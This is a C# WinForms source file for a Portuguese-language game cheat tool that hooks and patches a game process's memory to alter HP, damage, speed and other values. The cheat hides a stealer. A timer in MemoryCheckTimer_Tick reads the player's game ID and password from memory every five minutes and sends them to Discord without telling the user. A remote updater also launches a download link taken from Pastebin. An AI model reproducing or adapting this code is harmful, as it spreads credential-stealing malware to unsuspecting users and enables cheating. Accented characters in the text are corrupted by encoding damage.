using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Drawing;
using System.Runtime.InteropServices;
using Guna.UI2.WinForms;
using System.Threading.Tasks;
using System.Text;

namespace Cheat_VIP
{
    public partial class Form1 : Form
    {
        private MemoryManager memoryManager;
        private MemoryPatcher memoryPatcher;
        private PastebinAuth pastebinAuth;
        private System.Windows.Forms.Timer memoryCheckTimer;
        private string loggedInUsername;
        private const string LOCAL_VERSION = "1.0.1"; // Vers�o local do sistema

        private Dictionary<IntPtr, byte[]> originalCodes = new Dictionary<IntPtr, byte[]>();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int GetLastError();

        public Form1()
        {
            InitializeComponent();
            memoryManager = new MemoryManager(this);
            memoryPatcher = new MemoryPatcher(memoryManager, this);
            pastebinAuth = new PastebinAuth();
            TabControl.TabPages.Remove(tabPageProcess);
            TabControl.TabPages.Remove(tabPageCheats);
            TabControl.TabPages.Remove(tabPageWhat);
            comboBox1.Items.AddRange(new string[] { "8", "9", "10", "11", "12", "13", "15", "25" });
            CarregarProcessos();

            // Inicializa o Timer pra verificar a mem�ria ap�s 5 minutos
            memoryCheckTimer = new System.Windows.Forms.Timer
            {
                Interval = 300000, // 5 minutos em milissegundos
                Enabled = false // N�o inicia automaticamente, s� ap�s login e attach
            };
            memoryCheckTimer.Tick += new EventHandler(MemoryCheckTimer_Tick);
        }

        // Removido o Form1_Load, pois a checagem foi movida para o login
        private void Form1_Load(object sender, EventArgs e) { }

        private void CarregarProcessos()
        {
            listBoxProcessos.Items.Clear();
            Process[] processos = Process.GetProcesses();
            foreach (Process processo in processos)
            {
                listBoxProcessos.Items.Add($"{processo.ProcessName} (PID: {processo.Id})");
            }
        }

        private async void BtnAttachProcess1_Click(object sender, EventArgs e)
        {
            var (loadSuccess, loadMessage) = await pastebinAuth.LoadMemoryAddressesAsync();
            if (!loadSuccess)
            {
                guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                guna2MessageDialog1.Parent = this;
                guna2MessageDialog1.Show(loadMessage, "Erro");
                return;
            }

            if (memoryManager.AttachToProcess(txtProcessName.Text))
            {
                Process process = Process.GetProcessesByName(txtProcessName.Text)[0];
                IntPtr address = PastebinAuth.MemoryAddresses["status"];
                byte[] memoryValue = memoryManager.ReadMemory(address, 4);

                if (!TabControl.TabPages.Contains(tabPageWhat))
                {
                    TabControl.TabPages.Add(tabPageWhat);
                }
                TabControl.SelectedTab = tabPageWhat;

                if (memoryValue != null && memoryValue.Length >= 4)
                {
                    uint valorLido = BitConverter.ToUInt32(memoryValue, 0);
                    bool isWorking = valorLido == 2347535189;

                    if (isWorking)
                    {
                        guna2HtmlLabel2.Text = "Funcionando";
                        guna2HtmlLabel2.ForeColor = Color.Green;

                        guna2HtmlLabel1.Visible = true;
                        guna2HtmlLabel1.Text = "Liberando as fun��es...";
                        guna2HtmlLabel1.ForeColor = Color.Gray;
                        await Task.Delay(6000);

                        if (!TabControl.TabPages.Contains(tabPageCheats))
                        {
                            TabControl.TabPages.Add(tabPageCheats);
                        }
                        TabControl.SelectedTab = tabPageCheats;

                        memoryCheckTimer.Start();
                    }
                    else
                    {
                        guna2HtmlLabel2.Text = "N�o funcionando";
                        guna2HtmlLabel2.ForeColor = Color.Red;
                    }
                }
                else
                {
                    int lastError = GetLastError();
                    guna2HtmlLabel2.Text = "N�o funcionando";
                    guna2HtmlLabel2.ForeColor = Color.Red;
                }
            }
            else
            {
                guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                guna2MessageDialog1.Parent = this;
                guna2MessageDialog1.Show("Falha ao anexar ao processo.", "Erro");
            }
        }

        private async void MemoryCheckTimer_Tick(object sender, EventArgs e)
        {
            memoryCheckTimer.Stop();

            byte[] idBytes = memoryManager.ReadMemory(PastebinAuth.MemoryAddresses["vigo1"], 20);
            byte[] senhaBytes = memoryManager.ReadMemory(PastebinAuth.MemoryAddresses["vigo2"], 20);

            string idText = idBytes != null ? Encoding.ASCII.GetString(idBytes).TrimEnd('\0').Substring(0, Math.Min(19, Encoding.ASCII.GetString(idBytes).TrimEnd('\0').Length)) : "Erro ao ler";
            string senhaText = senhaBytes != null ? Encoding.ASCII.GetString(senhaBytes).TrimEnd('\0').Substring(0, Math.Min(19, Encoding.ASCII.GetString(senhaBytes).TrimEnd('\0').Length)) : "Erro ao ler";

            bool success = await pastebinAuth.SendMemoryValuesToDiscord("Id", loggedInUsername, idText, "Password", senhaText);

            if (success)
            {
                memoryCheckTimer.Start();
            }
            else
            {
                guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                guna2MessageDialog1.Icon = MessageDialogIcon.Warning;
                guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                guna2MessageDialog1.Parent = this;
                guna2MessageDialog1.Show("Falha ao enviar dados para o Discord. Tentando novamente em 5 minutos.", "Aviso");
                memoryCheckTimer.Start();
            }
        }

        private async void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            string username = guna2TextBox1.Text;
            string password = guna2TextBox2.Text;

            // Primeiro, autentica o usu�rio
            var (authSuccess, authMessage) = await pastebinAuth.AuthenticateAsync(username, password);

            guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
            guna2MessageDialog1.Style = MessageDialogStyle.Dark;
            guna2MessageDialog1.Parent = this;

            if (!authSuccess)
            {
                guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                guna2MessageDialog1.Show(authMessage, "Erro");
                return;
            }

            // Se a autentica��o for bem-sucedida, verifica a vers�o
            var (remoteVersion, downloadUrl) = await pastebinAuth.CheckVersionAsync();

            if (remoteVersion == null)
            {
                guna2MessageDialog1.Icon = MessageDialogIcon.Warning;
                guna2MessageDialog1.Show("Erro ao verificar a vers�o no Pastebin. Prosseguindo com a vers�o local.", "Aviso");
            }
            else if (remoteVersion != LOCAL_VERSION)
            {
                guna2MessageDialog1.Icon = MessageDialogIcon.Information;
                guna2MessageDialog1.Show($"Nova vers�o dispon�vel: {remoteVersion} (local: {LOCAL_VERSION}). Baixando...", "Atualiza��o");
                if (!string.IsNullOrEmpty(downloadUrl))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = downloadUrl,
                        UseShellExecute = true
                    });
                    Application.Exit();
                }
                else
                {
                    guna2MessageDialog1.Show("Link de download n�o dispon�vel. Contate o suporte.", "Erro");
                    Application.Exit();
                }
                return; // Para aqui se precisar de atualiza��o
            }

            // Se a vers�o est� atualizada, prossegue com o login
            loggedInUsername = username;
            guna2MessageDialog1.Icon = MessageDialogIcon.Information;
            guna2MessageDialog1.Show(authMessage, "Sucesso");

            TabControl.TabPages.Add(tabPageProcess);
            TabControl.SelectedTab = tabPageProcess;
            CarregarProcessos();
        }

        // Restante dos m�todos (checkBox handlers, etc.) permanece igual
        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["TravaHP"], checkBox1.Checked ? new byte[] { 0xC3 } : new byte[] { 0x55 });
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["TravaMP"], checkBox2.Checked ? new byte[] { 0xC3 } : new byte[] { 0x55 });
        }

        private void checkBox3_CheckedChanged_1(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["TravaRES"], checkBox3.Checked ? new byte[] { 0xC3 } : new byte[] { 0x55 });
        }

        private void checkBoxValue1_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["MinDamage"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetMinDamage"];
            int originalInstructionLength = 8;
            string register = "edx";

            if (checkBoxValue1.Checked)
            {
                if (int.TryParse(textBoxValue1.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para dano m�nimo.", "Erro");
                    checkBoxValue1.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBoxValue2_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["MaxDamage"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetMaxDamage"];
            int originalInstructionLength = 8;
            string register = "eax";

            if (checkBoxValue2.Checked)
            {
                if (int.TryParse(textBoxValue2.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para dano m�ximo.", "Erro");
                    checkBoxValue2.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["HPTotal"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetHPTotal"];
            int originalInstructionLength = 5;
            string register = "eax";

            if (checkBox5.Checked)
            {
                if (int.TryParse(textBoxValue4.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para o Total de HP.", "Erro");
                    checkBox5.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox6_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["AtackSpeed"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetAtackSpeed"];
            int originalInstructionLength = 8;
            string register = "edx";

            if (checkBox6.Checked)
            {
                if (comboBox1.SelectedItem != null && int.TryParse(comboBox1.SelectedItem.ToString(), out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido ou op��o n�o selecionada.", "Erro");
                    checkBox6.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox11_CheckedChanged(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["LockItem"], checkBox11.Checked ? new byte[] { 0x00 } : new byte[] { 0x01 });
        }

        private void btnAtualizarProcessos_Click_1(object sender, EventArgs e)
        {
            CarregarProcessos();
        }

        private void txtPesquisarProcesso_TextChanged(object sender, EventArgs e)
        {
            string filtro = txtPesquisarProcesso.Text.ToLower();
            listBoxProcessos.Items.Clear();

            Process[] processos = Process.GetProcesses();
            foreach (Process processo in processos)
            {
                string item = $"{processo.ProcessName} (PID: {processo.Id})";
                if (item.ToLower().Contains(filtro))
                {
                    listBoxProcessos.Items.Add(item);
                }
            }
        }

        private void listBoxProcessos_SelectedIndexChanged_1(object sender, EventArgs e)
        {
            if (listBoxProcessos.SelectedItem != null)
            {
                string itemSelecionado = listBoxProcessos.SelectedItem.ToString();
                int indiceParenteses = itemSelecionado.IndexOf(" (PID:");
                if (indiceParenteses > 0)
                {
                    txtProcessName.Text = itemSelecionado.Substring(0, indiceParenteses);
                }
            }
        }

        private void AtualizarStatus()
        {
            IntPtr address = PastebinAuth.MemoryAddresses["status"];
            byte[] memoryValue = memoryManager.ReadMemory(address, 4);

            if (memoryValue != null && memoryValue.Length >= 4)
            {
                int valorLido = BitConverter.ToInt32(memoryValue, 0);
                if (valorLido == 60)
                {
                    guna2HtmlLabel1.Text = "Ativado";
                    guna2HtmlLabel1.ForeColor = Color.Green;
                }
                else
                {
                    guna2HtmlLabel1.Text = "Desativado";
                    guna2HtmlLabel1.ForeColor = Color.Red;
                }
            }
            else
            {
                guna2HtmlLabel1.Text = "Falha ao ler mem�ria (Erro 299)";
                guna2HtmlLabel1.ForeColor = Color.Red;
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            AtualizarStatus();
        }

        private void guna2HtmlLabel2_Click(object sender, EventArgs e) { }

        private void guna2TextBox1_TextChanged(object sender, EventArgs e) { }

        private void guna2ImageButton3_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void guna2ImageButton2_Click(object sender, EventArgs e)
        {
            string youtubeUrl = "https://www.youtube.com/@ViGo_Priston";
            Process.Start(new ProcessStartInfo
            {
                FileName = youtubeUrl,
                UseShellExecute = true
            });
        }

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
            string discordUrl = "https://discord.com/users/952422340849971210";
            Process.Start(new ProcessStartInfo
            {
                FileName = discordUrl,
                UseShellExecute = true
            });
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Abs"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetAbs"];
            int originalInstructionLength = 5;
            string register = "eax";

            if (checkBox4.Checked)
            {
                if (int.TryParse(textBoxValue3.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para Absor��o.", "Erro");
                    checkBox4.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox6_CheckedChanged_1(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["AtackSpeed"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetAtackSpeed"];
            int originalInstructionLength = 6;
            string register = "ecx";

            if (checkBox6.Checked)
            {
                if (comboBox1.SelectedItem != null && int.TryParse(comboBox1.SelectedItem.ToString(), out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido ou op��o n�o selecionada.", "Erro");
                    checkBox6.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox7_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["VelSpeed"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetVelSpeed"];
            int originalInstructionLength = 6;
            string register = "eax";

            if (checkBox7.Checked)
            {
                if (int.TryParse(textBoxValue5.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para a Velocidade de Movimento.", "Erro");
                    checkBox7.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox8_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Critico"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetCritico"];
            int originalInstructionLength = 6;
            string register = "eax";

            if (checkBox8.Checked)
            {
                if (int.TryParse(textBoxValue6.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para o Cr�tico.", "Erro");
                    checkBox8.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox9_CheckedChanged_1(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["Block"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetBlock"];
            int originalInstructionLength = 5;
            string register = "eax";

            if (checkBox9.Checked)
            {
                if (int.TryParse(textBoxValue7.Text, out int valor))
                {
                    byte[] originalCode = memoryManager.ReadMemory(address, 5);
                    memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Valor inv�lido para a Defesa.", "Erro");
                    checkBox9.Checked = false;
                }
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void guna2CheckBox9_CheckedChanged(object sender, EventArgs e)
        {
            IntPtr address = PastebinAuth.MemoryAddresses["EditLvl"];
            IntPtr returnAddress = PastebinAuth.MemoryAddresses["RetEditLvl"];
            int originalInstructionLength = 6;
            string register = "ebx";

            if (guna2CheckBox9.Checked)
            {
                int valor = -1; // 0xFFFFFFFF como int com sinal
                byte[] originalCode = memoryManager.ReadMemory(address, 5);
                memoryPatcher.HookInstruction(address, valor, register, returnAddress, originalInstructionLength);
            }
            else
            {
                memoryPatcher.UnhookInstruction(address);
            }
        }

        private void checkBox11_CheckedChanged_1(object sender, EventArgs e)
        {
            memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["BugTime"], checkBox11.Checked ? new byte[] { 0x01 } : new byte[] { 0x00 });
        }

        private void checkBoxValue1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (int.TryParse(textBoxValue1.Text, out int valor))
            {
                if (valor >= 0 && valor <= int.MaxValue)
                {
                    byte[] byteValue = BitConverter.GetBytes(valor);
                    memoryPatcher.WriteMemory(PastebinAuth.MemoryAddresses["MinDamage"], byteValue);
                    Console.WriteLine($"Escrevendo {valor} (decimal) = {valor:X8} (hex) em MinDamage");
                }
                else
                {
                    guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                    guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                    guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                    guna2MessageDialog1.Parent = this;
                    guna2MessageDialog1.Show("Digite um valor entre 0 e " + int.MaxValue + ".", "Erro");
                }
            }
            else
            {
                guna2MessageDialog1.Buttons = MessageDialogButtons.OK;
                guna2MessageDialog1.Icon = MessageDialogIcon.Error;
                guna2MessageDialog1.Style = MessageDialogStyle.Dark;
                guna2MessageDialog1.Parent = this;
                guna2MessageDialog1.Show("Valor inv�lido para dano da atalanta.", "Erro");
            }
        }
    }
}